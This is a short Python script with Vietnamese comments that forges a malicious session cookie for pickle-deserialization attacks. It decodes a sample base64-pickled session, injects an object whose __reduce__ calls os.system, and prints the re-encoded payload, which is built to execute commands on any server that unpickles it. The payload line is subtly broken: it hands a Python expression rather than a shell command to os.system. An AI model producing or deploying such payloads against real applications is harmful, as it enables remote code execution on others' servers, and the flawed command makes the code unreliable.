import pickle
import base64
import os

class MaliciousCode:
    def __reduce__(self):
        # Mã bạn muốn thực thi
        command = "os.system('touch /tmp/exploit')"
        return (os.system, (command,))

# Đoạn session đã cho
session = "gAN9cQAoWAQAAABuYW1lcQFYBAAAAHRlc3RxAlgIAAAAdXNlcm5hbWVxA1gEAAAAdGVzdHEEWAgAAABwYXNzd29yZHEFWAQAAAB0ZXN0cQZ1Lg=="

# Giải mã session
session_data = base64.b64decode(session)

# Chuyển đổi session thành đối tượng
session_object = pickle.loads(session_data)

# Tạo một đối tượng MaliciousCode
malicious_object = MaliciousCode()

# Kiểm tra nếu session_object không phải là kiểu dict
if not isinstance(session_object, dict):
    session_object = {}

# Ghi đè session đã cho bằng đoạn session chứa mã độc hại
session_object['name'] = malicious_object

# Mã hóa session đã được thay đổi
malicious_session = base64.b64encode(pickle.dumps(session_object)).decode('utf-8')

# In ra đoạn session mới chứa mã độc hại
print(malicious_session)
